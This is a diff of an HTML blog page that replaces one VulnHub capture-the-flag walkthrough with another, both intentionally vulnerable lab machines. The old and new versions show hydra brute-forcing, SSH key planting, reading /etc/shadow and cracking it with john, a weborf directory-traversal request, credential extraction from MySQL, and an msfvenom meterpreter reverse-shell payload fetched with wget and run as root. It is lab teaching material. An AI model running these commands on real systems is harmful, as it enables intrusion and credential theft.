@@ -9,20 +9,20 @@
     <meta name="description" content="">
     <meta name="author" content="">
 
-    <title>Walkthrough sunset: nightfall</title>
+    <title>Walkthrough sunset: sunrise</title>
 	
 	<!-- Favicon -->
-	<link rel="shortcut icon" href="img/favicon.ico" type="image/icon"> 
-	<link rel="icon" href="img/favicon.ico" type="image/icon">
-	
-    <!-- Bootstrap Core CSS -->
-    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link rel="shortcut icon" href="../img/favicon.ico" type="image/icon"> 
+	<link rel="icon" href="../img/favicon.ico" type="image/icon">
+    
+	<!-- Bootstrap Core CSS -->
+    <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
 
     <!-- Theme CSS -->
-    <link href="css/clean-blog.min.css" rel="stylesheet">
+    <link href="../css/clean-blog.min.css" rel="stylesheet">
 
     <!-- Custom Fonts -->
-    <link href="vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="../vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
     <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
     <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
 
@@ -46,23 +46,23 @@
                     <span class="sr-only">Toggle navigation</span>
                     Menu <i class="fa fa-bars"></i>
                 </button>
-                <a class="navbar-brand" href="index.html">(´• ω •)</a>
+                <a class="navbar-brand" href="../">(´• ω •)</a>
             </div>
 
             <!-- Collect the nav links, forms, and other content for toggling -->
             <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
                 <ul class="nav navbar-nav navbar-right">
                     <li>
-                        <a href="index.html">Home</a>
+                        <a href="../">Home</a>
                     </li>
                     <li>
-                        <a href="about.html">About</a>
+                        <a href="../about/">About</a>
                     </li>
                     <li>
-                        <a href="post1.html">First Post</a>
+                        <a href="../os-hax-walkthrough/">First Post</a>
                     </li>
                     <li>
-                        <a href="contact.html">Contact</a>
+                        <a href="../contact/">Contact</a>
                     </li>
                 </ul>
             </div>
@@ -73,14 +73,14 @@
 
     <!-- Page Header -->
     <!-- Set your background image for this header on the line below. -->
-    <header class="intro-header" style="background-image: url('img/post4/nightfall.png')">
+    <header class="intro-header" style="background-image: url('../img/post5/sunrise.png')">
         <div class="container">
             <div class="row">
                 <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                     <div class="post-heading">
-                        <h1>sunset: nightfall</h1>
+                        <h1>sunset: sunrise</h1>
                         <h2 class="subheading">Difficulty: easy</h2>
-                        <span class="meta">Posted by <a href="about.html">Admin</a> on December 12, 2019</span>
+                        <span class="meta">Posted by <a href="about.html">Admin</a> on December 21, 2019</span>
                     </div>
                 </div>
             </div>
@@ -92,115 +92,110 @@
         <div class="container">
             <div class="row">
                 <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-                    <p><a href="https://www.vulnhub.com/entry/sunset-nightfall,355/">CTF link</a></p>
+                    <p><a href="https://www.vulnhub.com/entry/sunset-sunrise,406/">CTF link</a></p>
 					
-					<p>Good afternoon today I will walkthrough sunset: nightfall machine.</p>
+					<p>Good day, today I will walkthrough sunrise from a series of sunset machines.</p>
 					
-					<h2 class="section-heading">Beginning</h2>
+					<h2 class="section-heading">Explor1ng</h2>
 
-                    <p>First, scan the network and find ip.</p>
+                    <p>First, scan open ports</p>
 					
-					<a href="img/post4/image1.png">
-                        <img class="img-responsive" src="img/post4/image1.png" alt="">
+					<a href="../img/post5/image1.png">
+                        <img class="img-responsive" src="../img/post5/image1.png" alt="">
                     </a>
 
                     <pre><code>arp-scan -l</code></pre>
-
-                    <p>After going to the server web page I find the apache2 empty.</p>
 					
-					<a href="img/post4/image2.png">
-                        <img class="img-responsive" src="img/post4/image2.png" alt="">
-                    </a>
+					<pre><code>nmap 192.168.2.103</code></pre>
 					
 					<h2 class="section-heading">Boot2User</h2>
+
+                    <p>On port 80, I see an apache server with the default nginx file, but on port 8080 another web server is working that looks vulnerable, let's check it.</p>
 					
-					<p>With enum4linux I find the user matt and with hydra I get the password for ftp authorization.</p>
-					
-					<a href="img/post4/image31.png">
-                        <img class="img-responsive" src="img/post4/image31.	png" alt="">
+					<a href="../img/post5/image2.png">
+                        <img class="img-responsive" src="../img/post5/image2.png" alt="">
                     </a>
 					
-					<p> </p>
+					<p>After scanning server, I find the vulnerability "weborf 0.12.2 - Directory Traversal"</p>
 					
-					<a href="img/post4/image32.png">
-                        <img class="img-responsive" src="img/post4/image32.png" alt="">
+					<p><a href="https://www.exploit-db.com/exploits/14925">exploit link</a></p>
+					
+					<a href="../img/post5/image3.png">
+                        <img class="img-responsive" src="../img/post5/image3.png" alt="">
                     </a>
 					
-					<pre><code>enum4linux 192.168.2.100</code></pre>
-					<pre><code>hydra -l matt -P /root/rockyou.txt ftp://192.168.2.100</code></pre>
-					<pre><code>matt:cheese</code></pre>
+					<p>In the passwd file you can see the names of 2 users(sunrise and weborf).</p>
 					
-					<p>When I go to ftp I see the home directory, in order to gain access via ssh I create an authorized_keys file and drop it by ftp to the .ssh directory.</p>
-					
-					<a href="img/post4/image4.png">
-                        <img class="img-responsive" src="img/post4/image4.png" alt="">
+					<a href="../img/post5/image4.png">
+                        <img class="img-responsive" src="../img/post5/image4.png" alt="">
                     </a>
 					
-					<pre><code>cat ~/Nightfall/id_rsa.pub > authorized_keys</code></pre>
-					<pre><code>put authorized_keys</code></pre>
-					
-					<p>Now I connect via ssh and get the user</p>
-					
-					<a href="img/post4/image5.png">
-                        <img class="img-responsive" src="img/post4/image5.png" alt="">
+					<p>To find hidden files in the weborf server home directory using web vulnerabilities i use dirb.</p>
+					<a href="../img/post5/image5.png">
+                        <img class="img-responsive" src="../img/post5/image5.png" alt="">
                     </a>
 					
-					<h2 class="section-heading">Nightfall</h2>
+					<pre><code>dirb http://192.168.2.103:8080/%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf/</code></pre>
 					
-					<p>Using the LinEnum script, I find a file that can be used to escalate privileges to the nightfall user whom I found in /home directory.</p>
+					<p>Excellent in mysql history file i found server credentials and now I can log in via ssh.</p>
 					
-					<a href="img/post4/image6.png">
-                        <img class="img-responsive" src="img/post4/image6.png" alt="">
+					<a href="../img/post5/image6.png">
+                        <img class="img-responsive" src="../img/post5/image6.png" alt="">
                     </a>
 					
-					<p>After that I get nighfall user rights and user flag.</p>
+					<pre><code>weborf:iheartrainbows44</code></pre>
 					
-					<a href="img/post4/image7.png">
-                        <img class="img-responsive" src="img/post4/image7.png" alt="">
+					<h2 class="section-heading">Sunrise</h2>
+					
+					<p>Using credentials, I log in to mysql. After that, I find sunrise user credentials in mysql database.</p>
+					
+					<a href="../img/post5/image7.png">
+                        <img class="img-responsive" src="../img/post5/image7.png" alt="">
                     </a>
 					
-					<p>To get full nightfall user rights i use authorized_keys again.</p>
+					<pre><code>mysql -u weborf -p<</code></pre>
+					<pre><code>show databases;</code></pre>
+					<pre><code>use mysql;</code></pre>
+					<pre><code>SHOW tables;</code></pre>
+					<pre><code>SHOW COLUMNS FROM user;</code></pre>
+					<pre><code>SELECT User FROM user;</code></pre>
+					<pre><code>SELECT Password FROM user;</code></pre>
 					
-					<a href="img/post4/image8.png">
-                        <img class="img-responsive" src="img/post4/image8.png" alt="">
+					<p>Now you can log in via ssh as with user rights sunrise.</p>
+					
+					<a href="../img/post5/image8.png">
+                        <img class="img-responsive" src="../img/post5/image8.png" alt="">
                     </a>
 					
-					<pre><code>cp /home/matt/.ssh/authorized_keys /home/nightfall/.ssh/authorized_keys</code></pre>
-					
-					
-					<p>And connect via ssh</p>
-					
-					<a href="img/post4/image9.png">
-                        <img class="img-responsive" src="img/post4/image9.png" alt="">
-                    </a>
+					<pre><code>sunrise:thefutureissobrightigottawearshades</code></pre>
 					
 					<h2 class="section-heading">Boot2Root</h2>
 					
-					<p>Further I see that the nightfall user can run cat as root.</p>
+					<p>Using the sudo -l command, I see that I can run wine with root privileges.</p>
 					
-					<a href="img/post4/image10.png">
-                        <img class="img-responsive" src="img/post4/image10.png" alt="">
+					<a href="../img/post5/image9.png">
+                        <img class="img-responsive" src="../img/post5/image9.png" alt="">
                     </a>
 					
 					<pre><code>sudo -l</code></pre>
 					
-					<p>Using cat, I look at the contents of the /etc/shadow file that can be passed to John for decryption.</p>
-				
-                    <a href="img/post4/image11.png">
-                        <img class="img-responsive" src="img/post4/image11.png" alt="">
+					<p>Since wine is designed to run files with the .exe extension, I will generate paylod for windows using msfvenom. After generating payload, I move it using the apache2 server.</p>
+					
+					<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.100 LPORT=1313 -f exe > shell.exe</code></pre>
+					<pre><code>service apache2 start</code></pre>
+					<pre><code>wget http://192.168.2.100/shell.exe</code></pre>
+					
+					<p>After running shell.exe I get root access.</p>
+					
+					<a href="../img/post5/image11.png">
+                        <img class="img-responsive" src="../img/post5/image11.png" alt="">
                     </a>
 					
-					<pre><code>john shadow</code></pre>
-					<pre><code>root:miguel2</code></pre>
+					<p>And here is the root flag</p>
 					
-					<p>After decrypting the password, I use su and get root.</p>
-					
-					<a href="img/post4/image12.png">
-                        <img class="img-responsive" src="img/post4/image12.png" alt="">
+					<a href="../img/post5/image12.png">
+                        <img class="img-responsive" src="../img/post5/image12.png" alt="">
                     </a>
-					
-					<pre><code>su</code></pre>
-					
 					
                 </div>
             </div>
@@ -247,17 +242,17 @@
     </footer>
 
     <!-- jQuery -->
-    <script src="vendor/jquery/jquery.min.js"></script>
+    <script src="../vendor/jquery/jquery.min.js"></script>
 
     <!-- Bootstrap Core JavaScript -->
-    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
+    <script src="../vendor/bootstrap/js/bootstrap.min.js"></script>
 
     <!-- Contact Form JavaScript -->
-    <script src="js/jqBootstrapValidation.js"></script>
-    <script src="js/contact_me.js"></script>
+    <script src="../js/jqBootstrapValidation.js"></script>
+    <script src="../js/contact_me.js"></script>
 
     <!-- Theme JavaScript -->
-    <script src="js/clean-blog.min.js"></script>
+    <script src="../js/clean-blog.min.js"></script>
 
 </body>
 
